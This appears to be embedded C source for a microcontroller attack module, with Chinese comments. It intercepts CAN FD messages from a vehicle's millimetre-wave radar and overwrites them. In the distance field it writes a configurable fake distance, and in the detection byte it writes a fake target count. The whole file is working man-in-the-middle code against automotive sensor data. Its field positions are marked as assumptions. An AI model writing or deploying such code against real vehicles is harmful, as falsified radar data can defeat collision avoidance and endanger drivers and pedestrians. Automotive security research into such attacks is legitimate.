/**
  ******************************************************************************
  * @file    mmwave_attack.c
  * @brief   Millimeter-wave radar attack module implementation
  *          Implements millimeter-wave radar attacks by modifying CAN FD messages
  ******************************************************************************
  */

#include "mmwave_attack.h"
#include <string.h>

/* 私有变量 */
static uint8_t mmwave_attack_enabled = 0;
static uint16_t fake_distance = 0;      // 虚假距离（厘米）
static uint8_t fake_target_count = 0;   // 虚假目标数量

/**
  * @brief  初始化毫米波雷达攻击模块
  * @retval None
  */
void mmwave_attack_init(void)
{
    mmwave_attack_enabled = 0;
    fake_distance = 0;
    fake_target_count = 0;
}

/**
  * @brief  设置攻击参数
  * @param  enable: 攻击使能
  * @param  distance: 虚假距离（厘米）
  * @param  target_count: 虚假目标数量
  * @retval None
  */
void mmwave_set_attack_params(uint8_t enable, uint16_t distance, uint8_t target_count)
{
    mmwave_attack_enabled = enable;
    fake_distance = distance;
    fake_target_count = target_count;
}

/**
  * @brief  处理毫米波雷达CAN消息
  * @param  rx_header: CAN接收头
  * @param  rx_data: CAN数据指针
  * @retval None
  */
void mmwave_process_message(FDCAN_RxHeaderTypeDef *rx_header, uint64_t *rx_data)
{
    if(!mmwave_attack_enabled) return;
    
    // 检查是否是毫米波雷达相关的CAN ID
    uint32_t can_id = rx_header->Identifier;
    
    // 距离消息修改
    if(can_id == MMWAVE_DISTANCE_ID || (can_id >= MMWAVE_RADAR_ID_BASE && can_id < MMWAVE_RADAR_ID_BASE + 0x10)) {
        // 修改距离数据（假设距离在数据的低16位）
        uint64_t data = *rx_data;
        data &= ~0xFFFFULL;  // 清除低16位
        data |= (uint64_t)fake_distance;  // 设置虚假距离
        *rx_data = data;
    }
    
    // 目标检测消息修改
    if(can_id == MMWAVE_TARGET_DETECT_ID) {
        // 修改目标数量（假设在数据的第0字节）
        uint64_t data = *rx_data;
        data &= ~0xFFULL;  // 清除第0字节
        data |= (uint64_t)fake_target_count;  // 设置虚假目标数量
        *rx_data = data;
    }
    
    // 可以根据实际毫米波雷达协议添加更多修改逻辑
}

